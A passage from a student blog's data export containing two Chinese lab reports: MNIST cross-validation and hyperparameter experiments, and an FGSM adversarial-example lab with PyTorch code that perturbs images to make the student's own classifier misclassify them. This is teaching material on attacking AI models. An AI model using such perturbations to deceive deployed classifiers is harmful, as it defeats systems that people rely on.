kf.split(dataFold): # split # get train, val train_fold = torch.utils.data.dataset.Subset(dataFold, train_index) test_fold = torch.utils.data.dataset.Subset(dataFold, test_index) # package type of DataLoader train_loader = torch.utils.data.DataLoader(dataset=train_fold, batch_size=BATCH_SIZE, shuffle=True) test_loader = torch.utils.data.DataLoader(dataset=test_fold, batch_size=BATCH_SIZE, shuffle=True) # train model test_acc = torch.zeros([Iterations]) train_acc = torch.zeros([Iterations]) ## training the logistic model for i in range(Iterations): train(model, optimizer,criterion,i) train_acc[i] = test(model, criterion, train_loader, i,train=True) #Testing the the current CNN test_acc[i] = test(model, criterion, test_loader, i) #torch.save(model,&#x27;perceptron.pt&#x27;) # one epoch, all acc different_k_mse.append(np.array(test_acc)) return different_k_mse 按循序打印结果 123456testAcc_compare_map = &#123;&#125;for k_split_value in range(2, 10+1): print(&#x27;now k_split_value is:&#x27;, k_split_value) testAcc_compare_map[k_split_value] = train_flod_Mnist(k_split_value)for key in testAcc_compare_map:print(np.mean(testAcc_compare_map[key])) testAcc_compare_map是将不同k值下训练的结果保存起来，之后我们可以通过这个字典变量，计算出rmse ，比较不同k值下，实验结果的鲁棒性。 四、实验结果展示展示程序界面设计、运行结果及相关分析等，主要包括： 1）模型在验证集下的准确率（输出结果并截图）（10分） 下面的实验是k值为[2,10]下的结果，训练模型为简陋模型。 对照组：简陋模型，epoch为1，分层抽样（正确率只有83.79%） k折校验：简陋模型，epoch为1，K折交叉验证(K值为2到10)准确率越来越大 2）不同模型参数（隐藏层数、隐藏层节点数）对准确率的影响和分析 （10分） 本次实验中只探讨了简陋版模型与卷积模型的对比： 其中简陋版模型如下，先把图片变为一个以为张量，然后由一个全连接层链接，接入到ReLu层中，然后接入全连接层，可以看到，并没有使用卷积层，在epoch&#x3D;1的情况下只有83%的准确率。 1&gt;model = nn.Sequential(nn.Flatten(), nn.Linear(784, 256), nn.ReLU(),nn.Linear(256, 10)) 卷积模型如下，先定义卷积卷积层，输入通道为1，输出为32，核大小为3，一个Dropout2d层，以0.25的概率将通道输入置零，防止过拟合。然后是一个全连接层，输入为5408，输出为10，映射到10个分类结果。在forward中首先通过卷积层进行卷积，然后通过ReLU进行非线性变换，然后使用最大池化层进行采样，将图签尺寸缩小一半，然后用Dropout2d防止过拟合，接着把输出的张良展平为一维，并传入全连接层。 在 12345678910111213141516&gt;class Net(nn.Module): def __init__(self): super(Net, self).__init__() self.conv = nn.Conv2d(1, 32, 3) self.dropout = nn.Dropout2d(0.25) self.fc = nn.Linear(5408, 10) def forward(self, x): x = self.conv(x) x = F.relu(x) x = F.max_pool2d(x, 2) x = self.dropout(x) x = torch.flatten(x, 1) x = self.fc(x) output = F.log_softmax(x, dim=1) return output 可以看到在epoch&#x3D;1的情况下准确率达到97%，拟合效果非常好 3）不同训练参数（batch size、epoch num、学习率）对准确率的影响和分析 （10分） 注：默认值：在讨论某一变化时，其他值不变 123&gt;BATCH_SIZE =64&gt;Iterations = 1 # epoch&gt;learning_rate = 0.01 原始结果（83%） BATCH_SIZE讨论（可以发现当BATCH_SIZE越大时，准确率直线下降） 1&gt;&#123;&quot;16&quot;:&quot;90.85%&quot;,&quot;32&quot;:&quot;90.1000%&quot;,&quot;64&quot;:&quot;88.2200%&quot;,&quot;128&quot;:&quot;83.7100%&quot;,&quot;256&quot;:&quot;70.7300%&quot;,&quot;512&quot;:&quot;48.2400%&quot;&#125; epoch讨论(可以发现随着epoch的增大，准确率有较大提升，但是随着epoch越来越大，准确率增长越来越慢) 12[1,2,4,6,10,15][83.83,88.370,90.290,91.260,92.420,93.36] 学习率 可以看到，当学习率增大时，准确率有所增加，但是当学习率大于0.2时，准确率急速下滑到11%左右，也就是说，10个手写体正确率只有1个，趋于随机分布，是一个非常不好的模型，可见，学习率的选择至关重要。 12&gt;[0.01,0.02,0.05,0.1,0.2,0.5,1]&gt;[83.83,88.230,90.78,91.79,91.78,11.35,11.35] 4）留出法不同比例对结果的影响和分析 （10分） 因为pytorch中的训练集是固定输出的，对其更改较难，所以本小节使用TensorFlow进行实验： 数据集划分:其中a为训练比率，总共有70000个样本，按照比例进行训练和测试，结果如下 1234567891011121314151617181920212223&gt;np.random.seed(10)&gt;a = 0.8&gt;from keras.datasets import mnist&gt;(x_train_image,y_train_label),(x_test_image,y_test_label)=mnist.load_data()&gt;# x_all = x_train_image + x_test_image&gt;temp = np.append( x_train_image , x_test_image)&gt;x_all = temp.reshape(70000,28,28)&gt;print(len(y_train_label))&gt;y_lable = np.append(y_train_label,y_test_label)&gt;train_num = int(60000*a)&gt;x_train_image = x_all[:train_num]&gt;y_train_label = y_lable[:train_num]&gt;x_test_image = x_all[train_num:]&gt;y_test_label = y_lable[train_num:]&gt;x_Train=x_train_image.reshape(train_num,784).astype(&#x27;float32&#x27;)&gt;x_Test=x_test_image.reshape(70000-train_num,784).astype(&#x27;float32&#x27;) 12&gt;[0.1, 0.2, 0.3, 0.4, 0.5, 0.6, 0.7, 0.8, 0.9, 0.95, 0.9999]&gt;[0.9213, 0.9381, 0.9528, 0.9620, 0.9666, 0.9673, 0.9709, 0.9752, 0.9758, 0.9784, 0.9780] 可以看到随着训练样本的比率上升，总体的准确率也对应的明显的上升了，但是最后一组0.9999比率的组，较前一组0.95有所下降，这表明过大的训练比率对结果也会产生损害。 5）k折交叉验证法不同k值对结果的影响和分析 （10分） 把k值从2-10进行迭代计算，其他参数不变，结果为： 12345678&gt;testAcc_compare_map = &#123;&#125;&gt;for k_split_value in range(2, 10+1): print(&#x27;now k_split_value is:&#x27;, k_split_value) testAcc_compare_map[k_split_value] = cross_validation(k_split_value) &gt;for key in testAcc_compare_map: print(np.mean(testAcc_compare_map[key])) 可见K值对结果影响很大，且在一定范围内，越大越好。 五、实验总结及心得 本次实验熟知了pytorch和TensorFlow的使用，还有机器学习的整体流程和处理概况，解决了出现的诸多问题，尤其是在配置TensorFlow版本时出现的问题，熟知了基本的图像处理模型，以及卷积模型的基本构建。 在参数调配方面，详细了解了分层取样法，k折交叉验证法的使用以及效果还有比例的调试。还有在关键参数如batch size、epoch num、学习率方面有着较好的经验总结。","categories":[{"name":"学校作业","slug":"学校作业","permalink":"https://snowman12137.github.io/categories/%E5%AD%A6%E6%A0%A1%E4%BD%9C%E4%B8%9A/"}],"tags":[{"name":"机器学习","slug":"机器学习","permalink":"https://snowman12137.github.io/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"},{"name":"学校作业","slug":"学校作业","permalink":"https://snowman12137.github.io/tags/%E5%AD%A6%E6%A0%A1%E4%BD%9C%E4%B8%9A/"}],"author":"Sn0wma1n"},{"title":"大三网络安全智能终端实验一","slug":"大三网络安全智能终端实验一","date":"2023-05-04T12:09:16.000Z","updated":"2024-02-03T17:04:32.365Z","comments":true,"path":"2023/05/04/大三网络安全智能终端实验一/","link":"","permalink":"https://snowman12137.github.io/2023/05/04/%E5%A4%A7%E4%B8%89%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%99%BA%E8%83%BD%E7%BB%88%E7%AB%AF%E5%AE%9E%E9%AA%8C%E4%B8%80/","excerpt":"","text":"西安电子科技大学网信院 智能终端实验实验报告（一）班级：2018XX学号：20009XXXX日期：2023.4.24一、实验摘要研究不断推动机器学习模型更快，更精确，更有效。然而，设计和训练模型的一个经常被忽视的方面是安全性和鲁棒性，特别是在面对希望欺骗模型的对手时。向图像添加不可察觉的扰动可以导致完全不同的模型性能。我们将通过一个图像分类器的例子来探讨这个主题。具体来说，我们将使用第一个和最流行的攻击方法之一，快速梯度符号攻击(FGSM) ，以欺骗 MNIST 分类器。（摘自https://pytorch.org/tutorials/beginner/ fgsm_tutorial.htm l?highlight&#x3D;a dversarial% 20example%20generation） 二、实验内容a) 实验思路#### 简述 有许多类别的对抗性攻击，每种攻击都有不同的目标和对攻击者知识的假设。然而，一般来说，总体目标是向输入数据添加最少量的扰动，从而导致所需的错误分类。有几种假设攻击者的知识，其中两个是: 白盒和黑盒。白盒攻击假设攻击者对模型有完整的知识和访问权限，包括体系结构、输入、输出和权重。黑盒攻击假设攻击者只能访问模型的输入和输出，并且对底层架构或权重一无所知。还有几种类型的目标，包括错误分类和源&#x2F;目标错误分类。错误分类的目标意味着对手只希望输出分类是错误的，而不关心新的分类是什么。源&#x2F;目标错误分类意味着对手想要更改原来属于特定源类的图像，以便将其归类为特定目标类。在这种情况下，FGSM 攻击是以错误分类为目标的白盒攻击。有了这些背景信息，我们现在可以详细讨论这次攻击了。 快速梯度 原理简述快速梯度符号攻击（FGSA），是通过基于相同的反向传播梯度来调整输入数据使损失最大化，简言之，共计使用了丢失的梯度值w.r.t输入数据，然后调整输入使数据丢失最大化。下图是实现的例子： 可以看出x是正常“熊猫”的原始输入图像，y是真实的图片输入， θ表示模型参数，J(θ,x,y)是损失函数，∇x​J(θ,x,y)是攻击将梯度反向传播回要计算的输入数据。然后，它通过一个小步骤调整输入数据，如0.007倍的sign(∇x​J(θ,x,y))添加到里面会最大化损失函数。然后得到扰动图像x’，然后被目标网络错误地归类为“长臂猿”，而它显然仍然是一只“熊猫”。 b) 实现过程1.输入只有三个输入 Epsilons-运行时使用的 epsilon 值列表。在列表中保留0很重要，因为它表示原始测试集上的模型性能。此外，直观地，我们期望更大的 ε，更明显的扰动，但更有效的攻击方面的退化模型的准确性。因为这里的数据范围是 [ 0 , 1 ] [0,1] ，ε 值不应超过1。 Pretrain _ model-path加载预训练的模型 Use _ CUDA-boolean 标志来使用 CUDA，如果需要的话。 123epsilons = [0, .05, .1, .15, .2, .25, .3]pretrained_model = &quot;mnist_cnn.pt&quot;use_cuda=True 2.模型建立a)训练模型我們用了一層 convolution layer 和 pooling layer 來擷取 image 的 feature，之後要把這些 feature map 成 10 個 node 的 output（因為有 10 個 class 要 predict），所以用 flatten 把 feature 集中成 vector 後，再用 fully-connected layer map 到 output layer。b 是 batch size，一次 train 幾張 image。 12345678910111213141516class Net(nn.Module): def __init__(self): super(Net, self).__init__() self.conv = nn.Conv2d(1, 32, 3) self.dropout = nn.Dropout2d(0.25) self.fc = nn.Linear(5408, 10) def forward(self, x): x = self.conv(x) x = F.relu(x) x = F.max_pool2d(x, 2) x = self.dropout(x) x = torch.flatten(x, 1) x = self.fc(x) output = F.log_softmax(x, dim=1) return output b)训练函数123456789101112131415161718192021222324def train(model, train_loader, optimizer, epochs, log_interval): model.train() for epoch in range(1, epochs + 1): for batch_idx, (data, target) in enumerate(train_loader): # Clear gradient optimizer.zero_grad() # Forward propagation output = model(data) # Negative log likelihood loss loss = F.nll_loss(output, target) # Back propagation loss.backward() # Parameter update optimizer.step() # Log training info if batch_idx % log_interval == 0: print(&#x27;Train Epoch: &#123;&#125; [&#123;&#125;/&#123;&#125; (&#123;:.0f&#125;%)]\\tLoss: &#123;:.6f&#125;&#x27;.format( epoch, batch_idx * len(data), len(train_loader.dataset), 100. * batch_idx / len(train_loader), loss.item())) c)训练中的测试1234567891011121314151617181920def test(model, test_loader): model.eval() test_loss = 0 correct = 0 with torch.no_grad(): # disable gradient calculation for efficiency for data, target in test_loader: # Prediction output = model(data) # Compute loss &amp; accuracy test_loss += F.nll_loss(output, target, reduction=&#x27;sum&#x27;).item() pred = output.argmax(dim=1, keepdim=True) correct += pred.eq(target.view_as(pred)).sum().item() test_loss /= len(test_loader.dataset) # Log testing info print(&#x27;\\nTest set: Average loss: &#123;:.4f&#125;, Accuracy: &#123;&#125;/&#123;&#125; (&#123;:.0f&#125;%)\\n&#x27;.format( test_loss, correct, len(test_loader.dataset), 100. * correct / len(test_loader.dataset))) d)训练的主函数（把模型保存）12345678910111213141516171819202122232425262728293031323334def main(): # Training settings BATCH_SIZE = 64 EPOCHS = 2 LOG_INTERVAL = 10 # Define image transform transform=transforms.Compose([ transforms.ToTensor(), transforms.Normalize((0.1307,), (0.3081,)) # mean and std for the MNIST training set ]) # Load dataset train_dataset = datasets.MNIST(&#x27;./data&#x27;, train=True, download=True, transform=transform) test_dataset = datasets.MNIST(&#x27;./data&#x27;, train=False, transform=transform) train_loader = torch.utils.data.DataLoader(train_dataset, batch_size=BATCH_SIZE) test_loader = torch.utils.data.DataLoader(test_dataset, batch_size=BATCH_SIZE) # Create network &amp; optimizer model = Net() optimizer = optim.Adam(model.parameters()) # Train train(model, train_loader, optimizer, EPOCHS, LOG_INTERVAL) # Save and load model torch.save(model.state_dict(), &quot;mnist_cnn.pt&quot;) model = Net() model.load_state_dict(torch.load(&quot;mnist_cnn.pt&quot;)) # Test test(model, test_loader) 训练参数储存 e)训练结果 3.FGSM攻击a)模型加载加载模型 1234567891011121314151617181920# MNIST Test dataset and dataloader declarationtransform = transforms.Compose([ transforms.ToTensor(), ])train_dataset = datasets.MNIST(&#x27;./data&#x27;, train=True, download=True, transform=transform)test_loader = torch.utils.data.DataLoader(train_dataset,batch_size=1, shuffle=True)# Define what device we are usingprint(&quot;CUDA Available: &quot;,torch.cuda.is_available())device = torch.device(&quot;cuda&quot; if (use_cuda and torch.cuda.is_available()) else &quot;cpu&quot;)# Initialize the networkmodel = Net().to(device)# Load the pretrained modelmodel.load_state_dict(torch.load(&quot;mnist_cnn.pt&quot;, map_location=&#x27;cpu&#x27;))# Set the model in evaluation mode. In this case this is for the Dropout layersmodel.eval() b)攻击函数创建现在，我们可以通过扰动原始输入来定义创建对抗性示例的函数。Fgsm 攻击函数有三个输入，图像是原始清晰图像(xx) ，ε 是像素级扰动量(εε) ，data _ grad 是损失的梯度，输入图像(∇xJ(θ,x,y))。然后，该函数创建扰动图像$$perturbed_image&#x3D;image+epsilon∗sign(data_grad)&#x3D;x+ϵ∗sign(∇x​ J(θ,x,y))$$ 12345678910# FGSM attack codedef fgsm_attack(image, epsilon, data_grad): # Collect the element-wise sign of the data gradient sign_data_grad = data_grad.sign() # Create the perturbed image by adjusting each pixel of the input image perturbed_image = image + epsilon*sign_data_grad # Adding clipping to maintain [0,1] range perturbed_image = torch.clamp(perturbed_image, 0, 1) # Return the perturbed image return perturbed_image c)开始攻击12345678accuracies = []examples = []# Run test for each epsilonfor eps in epsilons: acc, ex = test(model, device, test_loader, eps) accuracies.append(acc) examples.append(ex) d) 实验结果截图第一个结果是精度对 ε 图。正如前面提到的，随着 ε 的增加，我们预计测试的准确性会降低。这是因为更大的 ε 意味着我们在将损失最大化的方向上迈出了更大的一步。注意曲线中的趋势不是线性的，即使 ε 值是线性间隔的。例如，ε &#x3D; 0.05 ε &#x3D; 0.05的准确性仅比 ε &#x3D; 0ε &#x3D; 0低约4% ，但是 ε &#x3D; 0.2 ε &#x3D; 0.2的准确性比 ε &#x3D; 0.15 ε &#x3D; 0.15低25% 。另外，请注意模型的精度在 ε &#x3D; 0.25 ε &#x3D; 0.25和 ε &#x3D; 0.3 ε &#x3D; 0.3之间的随机精度。 打印上述数据 12345678910111213141516# Plot several examples of adversarial samples at each epsilon cnt = 0 plt.figure(figsize=(8,10)) for i in range(len(epsilons)): for j in range(len(examples[i])): cnt += 1 plt.subplot(len(epsilons),len(examples[0]),cnt) plt.xticks([], []) plt.yticks([], []) if j == 0: plt.ylabel(&quot;Eps: &#123;&#125;&quot;.format(epsilons[i]), fontsize=14) orig,adv,ex = examples[i][j] plt.title(&quot;&#123;&#125; -&gt; &#123;&#125;&quot;.format(orig, adv)) plt.imshow(ex, cmap=&quot;gray&quot;) plt.tight_layout() plt.show() 打印几个代表性的例子 三、实验结果分析分析从结果来看，随着 ε 的增加，测试精度下降，但扰动变得更容易察觉。实际上，在攻击者必须考虑的精确度下降和可感知性之间存在权衡。在这里，我们展示了一些成功的对抗例子在每个 ε 值。图的每一行显示不同的 ε 值。第一行是 ε &#x3D; 0 ε &#x3D; 0的例子，它表示原始的“干净”图像，没有扰动。每张图片的标题都显示了“原始分类-&gt; 敌对分类”注意，当 ε &#x3D; 0.15 ε &#x3D; 0.15时，扰动开始变得明显，当 ε &#x3D; 0.3 ε &#x3D; 0.3时，扰动非常明显。然而，在所有情况下，人们仍然能够识别正确的类别，尽管增加了噪音。","categories":[{"name":"学校作业","slug":"学校作业","permalink":"https://snowman12137.github.io/categories/%E5%AD%A6%E6%A0%A1%E4%BD%9C%E4%B8%9A/"}],"tags":[{"name":"学校作业","slug":"学校作业","permalink":"https://snowman12137.github.io/tags/%E5%AD%A6%E6%A0%A1%E4%BD%9C%E4%B8%9A/"}]}],"categories":[{"name":"docker","slug":"docker","permalink":"https://snowman12137.github.io/categories/docker/"},{"name":"MAGs云分析","slug":"MAGs云分析","permalink":"https://snowman12137.github.io/categories/MAGs%E4%BA%91%E5%88%86%E6%9E%90/"},{"name":"生物计算机科学","slug":"MAGs云分析/生物计算机科学","permalink":"https://snowman12137.github.io/categories/MAGs%E4%BA%91%E5%88%86%E6%9E%90/%E7%94%9F%E7%89%A9%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/"},{"name":"其他","slug":"其他","permalink":"https://snowman12137.github.io/categories/%E5%85%B6%E4%BB%96/"},{"name":"前端学习","slug":"前端学习","permalink":"https://snowman12137.github.io/categories/%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0/"},{"name":"Electron-Vue-WebRTC客户端学习","slug":"Electron-Vue-WebRTC客户端学习","permalink":"https://snowman12137.github.io/categories/Electron-Vue-WebRTC%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%AD%A6%E4%B9%A0/"},{"name":"CTF网络攻防","slug":"CTF网络攻防","permalink":"https://snowman12137.github.io/categories/CTF%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/"},{"name":"SGX","slug":"SGX","permalink":"https://snowman12137.github.io/categories/SGX/"},{"name":"CTF入门","slug":"CTF入门","permalink":"https://snowman12137.github.io/categories/CTF%E5%85%A5%E9%97%A8/"},{"name":"学校作业","slug":"学校作业","permalink":"https://snowman12137.github.io/categories/%E5%AD%A6%E6%A0%A1%E4%BD%9C%E4%B8%9A/"}],"tags":[{"name":"docker","slug":"docker","permalink":"https://snowman12137.github.io/tags/docker/"},{"name":"metaGEM","slug":"metaGEM","permalink":"https://snowman12137.github.io/tags/metaGEM/"},{"name":"博客问题","slug":"博客问题","permalink":"https://snowman12137.github.io/tags/%E5%8D%9A%E5%AE%A2%E9%97%AE%E9%A2%98/"},{"name":"前端学习,VUE","slug":"前端学习-VUE","permalink":"https://snowman12137.github.io/tags/%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0-VUE/"},{"name":"Nodejs学习","slug":"Nodejs学习","permalink":"https://snowman12137.github.io/tags/Nodejs%E5%AD%A6%E4%B9%A0/"},{"name":"CTF网络攻防","slug":"CTF网络攻防","permalink":"https://snowman12137.github.io/tags/CTF%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/"},{"name":"SGX","slug":"SGX","permalink":"https://snowman12137.github.io/tags/SGX/"},{"name":"Linux","slug":"Linux","permalink":"https://snowman12137.github.io/tags/Linux/"},{"name":"现代密码学","slug":"现代密码学","permalink":"https://snowman12137.github.io/tags/%E7%8E%B0%E4%BB%A3%E5%AF%86%E7%A0%81%E5%AD%A6/"},{"name":"机器学习","slug":"机器学习","permalink":"https://snowman12137.github.io/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"},{"name":"学校作业","slug":"学校作业","permalink":"https://snowman12137.github.io/tags/%E5%AD%A6%E6%A0%A1%E4%BD%9C%E4%B8%9A/"}]}